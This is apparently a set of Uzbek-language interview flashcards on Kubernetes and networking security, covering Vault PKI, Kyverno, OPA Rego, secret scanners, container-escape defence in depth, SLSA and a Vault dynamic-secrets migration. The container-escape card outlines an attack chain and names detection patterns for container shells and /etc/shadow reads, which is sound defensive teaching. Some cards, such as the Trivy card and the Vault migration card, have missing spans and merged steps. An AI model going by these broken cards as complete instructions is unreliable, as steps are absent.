ttl=24h -format=json \<br>  | jq -r '.data.certificate' | openssl x509 -noout -dates -subject<br>vault write pki_int/tidy tidy_cert_store=true safety_buffer=72h   # eski yozuvlarni tozalash</pre><p>Kubernetes'da: cert-manager <code>Issuer</code> (Vault turi) orqali <code>Certificate</code> resurslari avtomatik.</p><p><b>Tuzoqlar:</b></p><ul><li>Har sertifikatni Vault storage'da saqlash (<code>no_store=false</code>) ko'p chiqarishda storage'ni shishiradi — qisqa TTL'da <code>no_store=true</code> va <code>tidy</code>.</li><li>Root CA'ni ham onlayn Vault'da uzoq TTL bilan saqlash — kompromat bo'lsa hammasi qayta qurilishi kerak.</li><li>Ilova sertifikatni qayta yuklamaydi — yangi sertifikat diskda, eski xotirada, muddati tugaydi.</li></ul><p><b>Senior nuqta:</b> Qisqa TTL revocation'ni deyarli keraksiz qiladi — CRL/OCSP infratuzilmasiga tayanish o'rniga sertifikat o'zi tez &quot;o'ladi&quot;. Service mesh bo'lsa, uning CA'sini Vault intermediate'iga ulash — yagona ishonch zanjiri.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41906	<p>Kyverno mutation qoidasi nima?</p>	<p><b>Qisqa javob:</b> Kyverno mutation qoidasi — resurs API server'ga yuborilganda (admission bosqichida) uni avtomatik o'zgartiradi: default label, resource request, <code>securityContext</code>, sidecar, image registry prefiksi qo'shadi. Natijada dasturchi har manifestga bir xil &quot;boilerplate&quot; yozishi shart emas, platforma standartlari majburan qo'llanadi.</p><pre>kubectl apply -&gt; apiserver -&gt; Mutating admission (Kyverno: patch qo'shadi)<br>                           -&gt; Validating admission (Kyverno/boshqa: tekshiradi)<br>                           -&gt; etcd<br>Mutation validatsiyadan OLDIN ishlaydi -&gt; mutate qilingan maydonni validate qoidasi ko'radi</pre><p><b>Amalda:</b></p><pre>apiVersion: kyverno.io/v1<br>kind: ClusterPolicy<br>metadata: { name: add-defaults }<br>spec:<br>  rules:<br>  - name: default-security-context<br>    match: { any: [{ resources: { kinds: [Pod] } }] }<br>    mutate:<br>      patchStrategicMerge:<br>        spec:<br>          securityContext:<br>            +(runAsNonRoot): true          # &quot;+()&quot; = faqat yo'q bo'lsa qo'sh<br>            +(seccompProfile): { type: RuntimeDefault }<br>  - name: default-team-label<br>    match: { any: [{ resources: { kinds: [Deployment] } }] }<br>    mutate:<br>      patchStrategicMerge:<br>        metadata: { labels: { +(team): unknown } }</pre><p>Tekshirish:</p><pre>kyverno apply policy.yaml --resource pod.yaml       # CI'da natijani oldindan ko'r<br>kubectl get pod mypod -o jsonpath='{.spec.securityContext}'</pre><p><code>mutateExisting</code> — mavjud resurslarni ham (background'da) o'zgartirish mumkin.</p><p><b>Tuzoqlar:</b></p><ul><li>GitOps bilan to'qnashuv: ArgoCD Git'dagi manifest va klasterdagi (mutate qilingan) holat farqini &quot;OutOfSync&quot; deb ko'radi — <code>ignoreDifferences</code> yoki mutation'ni Git'ga ko'chir.</li><li><code>+()</code> siz yozish — dasturchining aniq qiymatini ustidan yozib yuboradi.</li><li>Webhook ishlamasa (<code>failurePolicy</code>) — pod'lar yaratilmaydi yoki mutation'siz o'tadi.</li></ul><p><b>Senior nuqta:</b> Mutation — qulaylik, lekin &quot;yashirin sehr&quot;: manifestda yo'q narsa prod'da paydo bo'ladi. Qoida: xavfsizlik default'larini mutate qil, lekin muhim qarorlar (resource limit'lar) uchun validate bilan aniq yozishni talab qil.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41907	<p>OPA Rego tili nima?</p>	<p><b>Qisqa javob:</b> Rego — Open Policy Agent (OPA) ning deklarativ siyosat tili (Datalog'dan ilhomlangan). Siz &quot;qanday tekshirish&quot; ni emas, &quot;qaysi holat qoidani buzadi&quot; ni yozasiz; OPA JSON/YAML ko'rinishidagi input (K8s manifest, Terraform plan, HTTP so'rov) ustida so'rov bajarib qaror qaytaradi.</p><p><b>Nega kerak:</b> Siyosatlarni koddan ajratish (&quot;policy as code&quot;): bitta til bilan Kubernetes admission (Gatekeeper), Terraform plan (conftest), API avtorizatsiyasi (Envoy ext_authz) tekshiriladi, siyosatlar test qilinadi va versiyalanadi.</p><pre>input (JSON)  +  data (tashqi ma'lumot)  +  policy (Rego)<br>                       |<br>                    OPA engine<br>                       v<br>           qaror: {&quot;allow&quot;: false, &quot;deny&quot;: [&quot;image latest taqiqlangan&quot;]}</pre><p><b>Amalda (Rego v1 sintaksisi, OPA 1.0+):</b></p><pre>package k8s.images<br><br>import rego.v1<br><br>deny contains msg if {<br>    some c in input.spec.containers<br>    endswith(c.image, &quot;:latest&quot;)<br>    msg := sprintf(&quot;container %s: ':latest' tag taqiqlangan&quot;, [c.name])<br>}<br><br>deny contains msg if {<br>    some c in input.spec.containers<br>    not startswith(c.image, &quot;registry.corp.com/&quot;)<br>    msg := sprintf(&quot;container %s: faqat ichki registry&quot;, [c.name])<br>}</pre><pre>opa eval -d policy.rego -i pod.json 'data.k8s.images.deny'<br>conftest test deployment.yaml -p policy/          # CI'da<br>opa test policy/ -v                               # unit testlar (test_ prefiksli qoidalar)</pre><p><b>Tuzoqlar:</b></p><ul><li>Rego'da qoida &quot;hech narsa topilmasa&quot; undefined bo'ladi, <code>false</code> emas — <code>default allow := false</code> yozishni unutish.</li><li>Imperativ fikrlash (sikl, o'zgaruvchi) — Rego'da iteratsiya <code>some ... in</code> va unifikatsiya orqali.</li><li>OPA 1.0 (2024-dekabr) dan <code>if</code>/<code>contains</code> majburiy — eski misollar to'g'ridan ishlamaydi.</li></ul><p><b>Senior nuqta:</b> Rego kuchli, lekin jamoa uchun o'rganish narxi yuqori. Siyosatlarni testlar bilan, kutubxona sifatida (Gatekeeper library) boshqar; oddiy K8s qoidalari uchun Kyverno yoki CEL (<code>ValidatingAdmissionPolicy</code>) arzonroq bo'lishi mumkin.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41908	<p>Trivy secret scanning nima?</p>	<p><b>Qisqa javob:</b> Trivy secret scanning — fayllar va container image layer'lari ichida ochiq qolgan secret'larni (AWS access key, GitHub/Slack token, private key, GCP service account JSON va h.k.) regex qoidalari va kalit so'zlar bo'yicha qidiradi. Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41909	<p>Gitleaks pre-commit hook nima?</p>	<p><b>Qisqa javob:</b> Gitleaks pre-commit hook — <code>git commit</code> paytida lokal ishlaydigan tekshiruv: staged o'zgarishlarda secret pattern'lari (AWS kalit, token, private key) yoki yuqori entropiyali qatorlar topilsa commit'ni bloklaydi. Secret repo tarixiga umuman tushmaydi — bu eng arzon tuzatish nuqtasi.</p><p><b>Nega pre-commit:</b> Push'dan keyin topilgan secret allaqachon remote'da, CI log'larida, fork'larda — rotate qilish shart. Commit'dan oldin topilsa — shunchaki faylni tuzatasan.</p><pre>git commit<br>   v<br>.git/hooks/pre-commit -&gt; gitleaks (faqat staged diff)<br>   | topildi -&gt; exit 1 -&gt; commit BEKOR, fayl:qator ko'rsatiladi<br>   | toza    -&gt; commit davom etadi<br>   v<br>push -&gt; CI'da to'liq gitleaks skan (ikkinchi qatlam, hook'ni chetlab o'tganlar uchun)</pre><p><b>Amalda (pre-commit framework):</b></p><pre># .pre-commit-config.yaml<br>repos:<br>  - repo: https://github.com/gitleaks/gitleaks<br>    rev: v8.24.2<br>    hooks:<br>      - id: gitleaks</pre><pre>pip install pre-commit &amp;&amp; pre-commit install<br>git commit -m &quot;add config&quot;<br># Finding:     aws_secret_access_key = &quot;wJalrXUtnFEMI/K7MDENG...&quot;<br># RuleID:      aws-access-token<br># File:        config/dev.yaml   Line: 12</pre><p>False positive uchun: qator oxirida <code># gitleaks:allow</code> yoki <code>.gitleaksignore</code> ga fingerprint; maxsus qoidalar <code>.gitleaks.toml</code> da.</p><p><b>Tuzoqlar:</b></p><ul><li>Hook majburiy emas — <code>git commit --no-verify</code> bilan chetlab o'tiladi va har dasturchi <code>pre-commit install</code> qilmagan bo'lishi mumkin; shuning uchun CI va server tomonda (GitHub push protection) ham bo'lishi shart.</li><li>Juda ko'p false positive (test fixture'lar) — dasturchilar hook'ni o'chiradi; allowlist'ni sozla.</li><li>Sekin hook — butun repo'ni emas, faqat staged'ni skanerla.</li></ul><p><b>Senior nuqta:</b> Pre-commit — dasturchi tajribasi uchun (tez feedback), CI — majburlash uchun. Tashkilot darajasida template repo va devcontainer'da hook oldindan o'rnatilgan bo'lsin.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H29 Networking & security fundamentals	idrill-41910	<p>Trufflehog nima?</p>	<p><b>Qisqa javob:</b> TruffleHog (Truffle Security, open source) — Git tarixi, GitHub/GitLab org'lari, S3/GCS bucket'lar, Docker image'lar, fayl tizimi, Slack/Jira kabi manbalarda 800+ turdagi secret'ni qidiradi. Asosiy farqi — <b>verification</b>: topilgan kalitni tegishli API'ga (AWS, Stripe, GitHub) yuborib, u hali <b>faol</b> ekanini tekshiradi.</p><p><b>Nega verification muhim:</b> Skaner 300 ta &quot;secret&quot; topdi — ko'pi test qiymati yoki allaqachon o'chirilgan kalit. Verified natija &quot;bu kalit hozir ishlaydi, darhol rotate qil&quot; degani — shovqin keskin kamayadi va prioritet aniq.</p><pre>Manba (git tarix / S3 / image)<br>   v<br>Detector'lar (regex + kalit so'zlar, 800+ tur)<br>   v<br>Verification: AWS key -&gt; sts:GetCallerIdentity<br>              GitHub token -&gt; GET /user<br>   v<br>Natija: verified (faol!) / unverified / unknown</pre><p><b>Amalda:</b></p><pre>trufflehog git https://github.com/org/app --only-verified<br>trufflehog github --org=myorg --only-verified --json<br>trufflehog filesystem ./build --results=verified,unknown<br>trufflehog s3 --bucket=my-bucket<br>trufflehog docker --image myapp:1.4</pre><p>CI (GitHub Actions):</p><pre>- uses: trufflesecurity/trufflehog@&lt;commit-sha&gt;<br>  with: { extra_args: --only-verified }</pre><p><b>Gitleaks bilan farq:</b> Gitleaks — tez, oddiy, pre-commit uchun ideal. TruffleHog — keng manbalar va verification, tarixiy audit va org bo'yicha skan uchun kuchli. Ko'p jamoalar ikkalasini birga ishlatadi.</p><p><b>Tuzoqlar:</b></p><ul><li>Verification tashqi API'ga so'rov yuboradi — airgap muhitda ishlamaydi, va kalit egasining log'larida iz qoldiradi.</li><li>Faqat <code>--only-verified</code> — verify qilib bo'lmaydigan (ichki) secret'lar o'tkazib yuboriladi.</li><li>Topilgan faol kalit — darhol revoke, keyin audit (kalit qachondan beri ochiq, kim ishlatgan).</li></ul><p><b>Senior nuqta:</b> Yangi org'ni qabul qilganda yoki incident'dan keyin butun tarixni TruffleHog bilan skanerlash — standart qadam. Natijalarni &quot;verified&quot; bo'yicha prioritetlab, rotate jarayonini avtomatlashtir.</p>	lvl::Middle dom::net sec::h29 Networking_security_fundamentals
Interview Drill::Networking::H30 K8s security & zero trust	idrill-41911	<p>Ssenariy: klasterda container escape hujumi. Defense in depth blast radius'ni qanday cheklaydi?</p>	<p><b>Qisqa javob:</b> Container escape — hujumchi container ichidagi zaiflikdan foydalanib <b>host node</b>ga chiqishi. Bitta himoya qatlami yetarli emas, chunki har qatlam aylanib o'tilishi mumkin. Defense in depth — bir nechta mustaqil qatlam: har biri hujumning keyingi qadamini qiyinlashtiradi va hujumchi oxir-oqibat <b>kichik huquq, kichik hudud, ko'rinadigan</b> holatda qoladi.</p><h4>Hujum zanjiri (qatlamlar shu zanjirni uzadi)</h4><pre>1. Ilovadagi RCE (masalan deserialize bug)<br>2. Container ichida shell -&gt; asboblar yuklab olish<br>3. Huquqni oshirish (root, capability)<br>4. Kernel/runtime exploit -&gt; host'ga chiqish<br>5. Host'dan boshqa pod'lar, secret'lar, cloud metadata<br>6. Tarmoq bo'ylab tarqalish, ma'lumot chiqarish</pre><h4>Qatlamlar</h4><p><b>1. Root emas</b> (3-qadamni to'xtatadi)</p><pre>securityContext:<br>  runAsNonRoot: true<br>  runAsUser: 10001<br>  allowPrivilegeEscalation: false     # setuid binary orqali root bo'lolmaydi</pre><p>Escape bo'lsa ham, hujumchi host'da imtiyozsiz UID. <b>User namespaces</b> (<code>hostUsers: false</code>, K8s 1.30+) bilan container ichidagi root host'da oddiy user'ga map bo'ladi.</p><p><b>2. Capability'lar olib tashlangan</b> (4-qadam)</p><pre>  capabilities: { drop: [&quot;ALL&quot;] }<br>  seccompProfile: { type: RuntimeDefault }</pre><p>Ko'p escape exploit'lari <code>CAP_SYS_ADMIN</code> yoki xavfli syscall'larga (<code>unshare</code>, <code>mount</code>, <code>keyctl</code>) tayanadi — seccomp ularni bloklaydi.</p><p><b>3. Read-only fayl tizimi</b> (2-qadam)</p><pre>  readOnlyRootFilesystem: true</pre><p>Asbob yuklab yozib bo'lmaydi; kerakli joyga <code>emptyDir</code> (<code>/tmp</code>).</p><p><b>4. Minimal image</b> — distroless: <code>sh</code>, <code>curl</code>, paket menejer yo'q. Hujumchida asbob yo'q.</p><p><b>5. Sandbox runtime</b> (4-qadam, eng kuchli) gVisor (<code>runsc</code>) syscall'larni userspace kernel'da ushlaydi; Kata — har pod alohida yengil VM. Ishonchsiz kod uchun:</p><pre>runtimeClassName: gvisor</pre><p><b>6. Host'da hech narsa ochiq emas</b> — <code>hostPath</code>, <code>hostNetwork</code>, <code>hostPID</code>, <code>privileged</code> yo'q. Pod Security Admission <code>restricted</code> bularni majburiy qiladi.</p><p><b>7. Tarmoq — default deny</b> (6-qadam) Egress NetworkPolicy: faqat kerakli servislar. Internetga chiqish yo'q — reverse shell va C2 ishlamaydi. Cloud metadata (<code>169.254.169.254</code>) bloklangan — node IAM credential'larini o'g'irlab bo'lmaydi (IMDSv2 hop limit 1).</p><p><b>8. Minimal huquqlar</b> (5-qadam) ServiceAccount token kerak bo'lmasa <code>automountServiceAccountToken: false</code>; RBAC minimal; IRSA/Workload Identity — node rolida keng huquq yo'q.</p><p><b>9. Aniqlash va javob</b> Falco/Tetragon: &quot;container'da shell ochildi&quot;, &quot;<code>/etc/shadow</code> o'qildi&quot;, &quot;kutilmagan tarmoq ulanishi&quot;. Alert -&gt; node'ni cordon, pod'ni izolyatsiya (forensika uchun saqlab), credential'larni rotatsiya.</p><p><b>10. Patching</b> — kernel, containerd/runc tez yangilanadi; ko'p escape'lar ma'lum CVE (masalan runc CVE-2019-5736, CVE-2024-21626).</p><p><b>Senior nuqta:</b> Container — xavfsizlik chegarasi emas, umumiy kernel bor. Haqiqatan ishonchsiz yuk (multi-tenant, foydalanuvchi kodi) uchun kuchli chegara kerak: sandbox runtime yoki alohida node pool/klaster. Qatlamlar escape'ni imkonsiz qilmaydi — uni qiyin, sekin va <b>ko'rinadigan</b> qiladi.</p>	lvl::Senior dom::net sec::h30 K8s_security_zero_trust
Interview Drill::Networking::H30 K8s security & zero trust	idrill-41912	<p>Ssenariy: SLSA Level 3 ga mos avtomatik end-to-end supply chain xavfsizlik pipeline'ini loyihalang.</p>	<p><b>Qisqa javob:</b> SLSA (Supply-chain Levels for Software Artifacts) Level 3 — &quot;production'da ishlayotgan artefakt aynan review qilingan koddan, ishonchli va izolyatsiyalangan build tizimida yasalgan&quot; ekanini <b>kriptografik isbotlash</b>. Pipeline'ning har bosqichi keyingisi tekshiradigan dalil (imzo, provenance) qoldiradi va K8s admission'da hammasi tekshiriladi.</p><h4>Nimadan himoya</h4><ul><li>Dasturchi akkaunti buzilib, review'siz kod qo'shilishi.</li><li>Build serveri buzilib, artefaktga backdoor qo'shilishi (SolarWinds).</li><li>Registry'da image almashtirilishi.</li><li>Zararli dependency.</li></ul><h4>Pipeline</h4><pre>Commit -&gt; PR (2 kishi review, branch protection, imzolangan commit)<br>   |<br>   v<br>Ephemeral, izolyatsiyalangan build runner (har job yangi, hech narsa saqlanmaydi)<br>   1. Dependency'lar lock fayl + ichki proxy orqali (hash bilan)<br>   2. Image build (BuildKit, reproducible)<br>   3. SBOM (Syft, CycloneDX) — image ichida nima bor<br>   4. Zaiflik skani (Grype/Trivy) — critical bo'lsa to'xtash<br>   5. Provenance (in-toto/SLSA): qaysi repo, commit, workflow, runner<br>   6. Cosign keyless imzo (Fulcio, OIDC identity) -&gt; Rekor log<br>   |<br>   v<br>Registry (digest bo'yicha, tag emas)<br>   |<br>   v<br>K8s admission (Kyverno/Sigstore policy-controller):<br>   imzo + provenance + SBOM tekshiriladi; mos kelmasa pod rad etiladi</pre><h4>Asosiy tushunchalar</h4><ul><li><b>Provenance</b> — artefakt &quot;pasporti&quot;: <code>repo=github.com/org/pay</code>, <code>commit=abc123</code>, <code>builder=github-actions</code>, <code>workflow=.github/workflows/release.yml</code>. SLSA L3'da uni <b>build platformasi</b> yaratadi va imzolaydi — build skripti o'zi soxtalashtira olmaydi (<code>slsa-github-generator</code>).</li><li><b>Keyless imzo</b> — kalit saqlanmaydi. Workflow OIDC token oladi, Fulcio qisqa muddatli sertifikat beradi (identity = workflow yo'li), imzo Rekor shaffoflik jurnaliga yoziladi.</li><li><b>Digest</b> — <code>image@sha256:...</code>. Tag (<code>:v1.2</code>) o'zgartirilishi mumkin, digest yo'q.</li></ul><h4>Admission policy (Kyverno)</h4><pre>verifyImages:<br>- imageReferences: [&quot;ghcr.io/org/*&quot;]<br>  attestors:<br>  - entries:<br>    - keyless:<br>        subject: &quot;https://github.com/org/*/.github/workflows/release.yml@refs/heads/main&quot;<br>        issuer: &quot;https://token.actions.githubusercontent.com&quot;<br>  attestations:<br>  - type: https://slsa.dev/provenance/v1</pre><p>Faqat <code>main</code> branch'dagi release workflow imzolagan image'lar ishlaydi — dasturchi noutbukidan push qilingan image rad etiladi.</p><h4>Qo'shimcha nazoratlar</h4><ul><li>GitHub Actions'ni <b>SHA bilan pin</b> (<code>uses: actions/checkout@&lt;sha&gt;</code>) — tag o'zgartirilishi mumkin.</li><li>Workflow'larga minimal <code>permissions:</code>.</li><li>Runner'lardan internetga chiqish cheklangan.</li><li>OpenSSF Scorecard bilan repo sozlamalarini tekshirish.</li></ul><p><b>Senior nuqta:</b> Eng zaif nuqta odatda build tizimining o'zi va uning secret'lari. SLSA L3'ning mohiyati — build <b>tenant'lar</b> orasida izolyatsiya va provenance'ni build skripti emas, platforma yaratishi. Imzolash bor, lekin admission'da tekshirilmasa — hech qanday foyda yo'q.</p>	lvl::Senior dom::net sec::h30 K8s_security_zero_trust
Interview Drill::Networking::H30 K8s security & zero trust	idrill-41913	<p>Ssenariy: hardcode DB parolli legacy ilovani Vault dynamic secrets'ga downtime'siz qanday ko'chirasiz?</p>	<p><b>Qisqa javob:</b> Asosiy g'oya: o'tish davrida DB <b>ikkala</b> credential turini (eski statik va yangi dynamic) qabul qiladi, ilova esa parolni koddan emas <b>fayldan</b> o'qiydigan qilinadi. Vault tayyorlash</h4><pre>vault secrets enable database<br>vault write database/config/orders plugin_name=postgresql-database-plugin \<br>  connection_url=&quot;postgresql://{{username}}:{{password}}@db:5432/orders&quot; \<br>  allowed_roles=&quot;orders-app&quot; username=&quot;vault_admin&quot; password=&quot;...&quot;<br><br>vault write database/roles/orders-app db_name=orders \<br>  creation_statements=&quot;CREATE ROLE \&quot;{{name}}\&quot; LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}' IN ROLE orders_rw;&quot; \<br>  default_ttl=1h max_ttl=24h</pre><p><code>IN ROLE orders_rw</code> — dynamic user'lar eski statik user bilan <b>bir xil huquqlarni</b> oladi (umumiy guruh role). Jadval egaligi muammosi bo'lmasligi uchun obyektlar <code>orders_rw</code> roliga tegishli bo'lsin.</p><p>K8s auth: pod ServiceAccount orqali Vault'ga kiradi.</p><h4>2. Bu bo'lmasa, 1 soatdan keyin ulanishlar uziladi.</li><li>Bu versiya avval <b>eski</b> parol bilan (faylga vaqtincha statik parol qo'yib) deploy qilinadi — xatti-harakat o'zgarmaydi, xavf kam.</li></ul><h4>3. Muqobil — External Secrets Operator (K8s Secret orqali).</p><h4>4. Rolling deploy</h4><p>Pod'lar birma-bir almashadi: yangilari dynamic user bilan, eskilari statik parol bilan — DB ikkalasini qabul qiladi. <code>maxUnavailable: 0</code>, readiness probe DB ulanishini tekshiradi.</p><h4>5. Tekshirish</h4><pre>SELECT usename, count(*) FROM pg_stat_activity GROUP BY 1;</pre><p>Faqat <code>v-orders-app-*</code> ulanishlari qolganini kutish.</p><h4>6. Git tarixidagi eski parol endi yaroqsiz.</p><h4>Xavflar</h4><ul><li>Vault ishlamay qolsa — yangi pod'lar ishga tushmaydi.
